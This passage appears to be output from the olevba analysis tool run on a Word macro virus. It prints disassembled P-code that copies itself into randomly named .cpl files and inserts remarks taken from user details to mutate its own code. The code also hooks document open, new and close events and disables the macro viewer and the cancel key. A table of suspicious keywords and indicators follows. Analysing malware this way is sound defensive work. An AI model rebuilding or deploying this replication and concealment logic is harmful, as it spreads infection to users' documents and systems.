' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #680:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #681:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #682:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #683:
' 	QuoteRem 0x0001 0x0000 ""
' Line #684:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #685:
' 	QuoteRem 0x0001 0x0000 ""
' Line #686:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	NextVar 
' Line #687:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #688:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St False 
' Line #689:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #690:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld False 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID2 
' Line #691:
' 	Ld FileID2 
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #692:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #693:
' 	Do 
' Line #694:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #695:
' 	Label inpux 
' Line #696:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #697:
' 	QuoteRem 0x0001 0x0000 ""
' Line #698:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #699:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #700:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #701:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #702:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #703:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #704:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #705:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	GoTo inpux 
' 	EndIf 
' Line #706:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #707:
' 	QuoteRem 0x0001 0x0000 ""
' Line #708:
' 	QuoteRem 0x0000 0x0047 " Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)"
' Line #709:
' 	QuoteRem 0x0001 0x0000 ""
' Line #710:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #711:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #712:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #713:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #714:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #715:
' 	QuoteRem 0x0001 0x0000 ""
' Line #716:
' 	LitStr 0x001C "C:\windows\system\export.sys"
' 	ArgsCall Kill 0x0001 
' Line #717:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0005 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #718:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #719:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID2 
' 	PrintItemNL 
' Line #720:
' 	LitDI2 0x0005 
' 	Sharp 
' 	Close 0x0001 
' Line #721:
' 	QuoteRem 0x0001 0x0000 ""
' Line #722:
' 	EndSub 
' Line #723:
' 	FuncDefn (Sub AutoNew())
' Line #724:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #725:
' 	OnError (Resume Next) 
' Line #726:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #727:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #728:
' 	EndSub 
' Line #729:
' 	FuncDefn (Sub AutoOpen())
' Line #730:
' 	OnError (Resume Next) 
' Line #731:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #732:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #733:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #734:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #735:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #736:
' 	EndSub 
' Line #737:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #738:
' 	FuncDefn (Sub FileTemplates())
' Line #739:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #740:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #741:
' 	QuoteRem 0x0001 0x0000 ""
' Line #742:
' 	EndSub 
' Line #743:
' 	FuncDefn (Sub ToolsCustomize())
' Line #744:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #745:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #746:
' 	EndSub 
' Line #747:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #748:
' 	FuncDefn (Sub ToolsMacro())
' Line #749:
' 	QuoteRem 0x0001 0x0000 ""
' Line #750:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #751:
' 	QuoteRem 0x0001 0x0012 "Replication System"
' Line #752:
' 	EndSub 
' Line #753:
' 	FuncDefn (Sub ViewVBCode())
' Line #754:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #755:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #756:
' 	EndSub 
' Line #757:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #758:
' 	QuoteRem 0x0000 0x0035 " "The most polymorphic Macro Virus to date...." - NAI"
' Line #759:
' 	QuoteRem 0x0001 0x0000 ""
' Line #760:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #761:
' Line #762:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #763:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #764:
' 	QuoteRem 0x0001 0x0002 "RS"
' Line #765:
' 	FuncDefn (Sub FileClose())
' Line #766:
' 	OnError (Resume Next) 
' Line #767:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #768:
' 	Ld Wordbasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #769:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

